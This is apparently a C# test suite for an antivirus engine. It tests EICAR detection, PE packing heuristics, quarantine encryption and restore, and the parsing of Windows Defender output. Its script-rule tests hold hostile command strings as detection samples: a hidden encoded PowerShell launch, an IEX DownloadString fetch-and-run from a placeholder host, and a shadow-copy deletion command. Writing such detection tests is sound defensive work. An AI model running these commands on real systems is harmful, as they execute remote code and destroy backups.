using System.Security.Cryptography;
using System.Text;
using FortKnox.Muralha;
using Xunit;

namespace FortKnox.Core.Tests;

/// <summary>
/// Fase 3.5a. O arquivo de teste EICAR é verificado só em memória (gravá-lo no disco faria o Defender agir no meio do teste);
/// o caminho completo com arquivo usa um "malware" de mentira: conteúdo inofensivo cujo hash é colocado numa base de teste.
/// </summary>
public sealed class MuralhaTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "fkmur-" + Guid.NewGuid().ToString("N"));
    public MuralhaTests() => Directory.CreateDirectory(_dir);
    public void Dispose() { try { Directory.Delete(_dir, true); } catch { } }

    // Montado em duas partes para este arquivo não ser o próprio arquivo de teste.
    private static byte[] Eicar => Encoding.ASCII.GetBytes("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

    private static string Sha(byte[] b) => Convert.ToHexString(SHA256.HashData(b)).ToLowerInvariant();

    private static ScanResult Eval(MuralhaEngine e, string name, byte[] content) =>
        e.Evaluate(Path.Combine("C:\\x", name), Path.GetExtension(name), Sha(content), content, content.Length);

    [Fact]
    public void Eicar_IsCaughtByHash_AndByRule()
    {
        var engine = new MuralhaEngine(SignatureBase.Embedded()) { UseDefender = false };
        var byHash = Eval(engine, "eicar.com", Eicar);
        Assert.Equal(Verdict.Malicioso, byHash.Verdict);
        Assert.Equal("hash", byHash.Layer);

        // Com um byte a mais no fim o hash muda, mas a regra de conteúdo ainda pega.
        var byRule = Eval(engine, "eicar.com", Eicar.Concat("\r\n"u8.ToArray()).ToArray());
        Assert.Equal(Verdict.Malicioso, byRule.Verdict);
        Assert.Equal("regra", byRule.Layer);
        Assert.Contains("EICAR", byRule.Reason);
    }

    [Fact]
    public void EmbeddedBase_Parses()
    {
        var b = SignatureBase.Embedded();
        Assert.NotEmpty(b.Version);
        Assert.Single(b.Hashes);
        Assert.Equal(5, b.Rules.Count);
        Assert.Equal("X5O!P", b.Rules[0].AllOf[0][0][..5]); // \x58 virou X
    }

    [Theory]
    [InlineData("a.ps1", "powershell -w hidden -enc SQBFAFgA", Verdict.Suspeito)]
    [InlineData("b.bat", "powershell.exe -NoP -WindowStyle Hidden -EncodedCommand AAAA", Verdict.Suspeito)]
    [InlineData("c.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://exemplo')", Verdict.Suspeito)]
    [InlineData("d.cmd", "vssadmin delete shadows /all /quiet", Verdict.Suspeito)]
    [InlineData("e.ps1", "Get-ChildItem C:\\ | Sort-Object Length", Verdict.Limpo)]
    [InlineData("f.ps1", "Invoke-WebRequest https://exemplo -OutFile x.zip", Verdict.Limpo)] // baixar sem executar não é suspeito
    [InlineData("g.txt", "powershell -w hidden -enc AAAA", Verdict.Limpo)]            // regra só vale para scripts
    public void ScriptRules(string name, string content, Verdict expected)
    {
        var engine = new MuralhaEngine(SignatureBase.Embedded()) { UseDefender = false };
        Assert.Equal(expected, Eval(engine, name, Encoding.UTF8.GetBytes(content)).Verdict);
    }

    [Fact]
    public void Entropy_RandomIsHigh_TextIsLow()
    {
        Assert.True(PeHeuristics.Entropy(RandomNumberGenerator.GetBytes(8192)) > 7.5);
        Assert.True(PeHeuristics.Entropy(Encoding.ASCII.GetBytes(string.Concat(Enumerable.Repeat("abcabc ", 2000)))) < 3);
    }

    [Fact]
    public void PackedPe_InTemp_IsSuspicious_ButOneSignIsNot()
    {
        byte[] pe = FakePe("UPX0", RandomNumberGenerator.GetBytes(8192));
        Assert.Equal(2, PeHeuristics.Signs(pe, Path.Combine(_dir, "x.exe")).Count(s => !s.Contains("pasta"))); // empacotado + entropia
        var engine = new MuralhaEngine(new SignatureBase()) { UseDefender = false };
        Assert.Equal(Verdict.Suspeito, Eval(engine, "x.exe", pe).Verdict);
        Assert.Equal(Verdict.Limpo, Eval(engine, "y.exe", FakePe(".text", new byte[8192])).Verdict);
    }

    /// <summary>PE mínimo com uma seção executável de 8 KB (só para a heurística ler os cabeçalhos).</summary>
    private static byte[] FakePe(string section, byte[] code)
    {
        var b = new byte[0x400 + code.Length];
        b[0] = (byte)'M'; b[1] = (byte)'Z';
        BitConverter.GetBytes(0x80).CopyTo(b, 0x3C);
        b[0x80] = (byte)'P'; b[0x81] = (byte)'E';
        BitConverter.GetBytes((ushort)1).CopyTo(b, 0x80 + 6);     // 1 seção
        BitConverter.GetBytes((ushort)0xE0).CopyTo(b, 0x80 + 20); // tamanho do cabeçalho opcional
        int s = 0x80 + 24 + 0xE0;
        Encoding.ASCII.GetBytes(section).CopyTo(b, s);
        BitConverter.GetBytes((uint)code.Length).CopyTo(b, s + 16);
        BitConverter.GetBytes(0x400u).CopyTo(b, s + 20);
        BitConverter.GetBytes(0x60000020u).CopyTo(b, s + 36);    // código, executável, leitura
        code.CopyTo(b, 0x400);
        return b;
    }

    [Fact]
    public async Task FileScan_Quarantine_AndRestore()
    {
        byte[] fake = Encoding.UTF8.GetBytes("conteudo inofensivo marcado como ameaca so neste teste " + Guid.NewGuid());
        var signatures = SignatureBase.Parse($"hash {Sha(fake)} Ameaça de teste");
        var engine = new MuralhaEngine(signatures) { UseDefender = false };
        string file = Path.Combine(_dir, "Downloads", "brinde.exe");
        Directory.CreateDirectory(Path.GetDirectoryName(file)!);
        await File.WriteAllBytesAsync(file, fake);
        File.WriteAllText(Path.Combine(_dir, "Downloads", "notas.txt"), "fora dos tipos de risco");

        var files = MuralhaEngine.Enumerate(new[] { _dir }, int.MaxValue, CancellationToken.None).ToList();
        Assert.Equal(new[] { file }, files);
        var r = await engine.ScanFileAsync(file);
        Assert.Equal(Verdict.Malicioso, r.Verdict);

        var q = new Quarantine(Path.Combine(_dir, "Quarentena"));
        var item = q.Add(file, r.Verdict, r.Reason);
        Assert.False(File.Exists(file));
        var stored = File.ReadAllBytes(Directory.GetFiles(q.Folder, "*.fkq").Single());
        Assert.Equal(-1, stored.AsSpan().IndexOf(fake.AsSpan(0, 20))); // cifrado: o conteúdo não aparece
        Assert.Single(q.List());

        // Um arquivo novo com o mesmo nome apareceu: a restauração não sobrescreve.
        File.WriteAllText(file, "outro");
        string restored = q.Restore(item.Id);
        Assert.NotEqual(file, restored);
        Assert.Equal(fake, File.ReadAllBytes(restored));
        Assert.Empty(q.List());
    }

    [Theory]
    [InlineData("Scan starting...\r\nScan finished.\r\nScanning C:\\x.exe found no threats.", false)]
    [InlineData("Scanning C:\\x.exe found 1 threats.\r\nThreat information\r\nThreat  : Virus:DOS/EICAR_Test_File", true)]
    [InlineData("CmdTool: Failed with hr = 0x80004005. Check C:\\Temp\\MpCmdRun.log", null)] // Defender desligado: código 2, mas não é ameaça
    [InlineData("", null)]
    public void Defender_Output(string output, bool? expected) => Assert.Equal(expected, Defender.Interpret(output));

    [Fact]
    public void Quarantine_Delete_RemovesForGood()
    {
        string file = Path.Combine(_dir, "a.ps1");
        File.WriteAllText(file, "teste");
        var q = new Quarantine(Path.Combine(_dir, "Q"));
        var item = q.Add(file, Verdict.Suspeito, "teste");
        q.Delete(item.Id);
        Assert.Empty(q.List());
        Assert.Empty(Directory.GetFiles(q.Folder, "*.fkq"));
    }
}
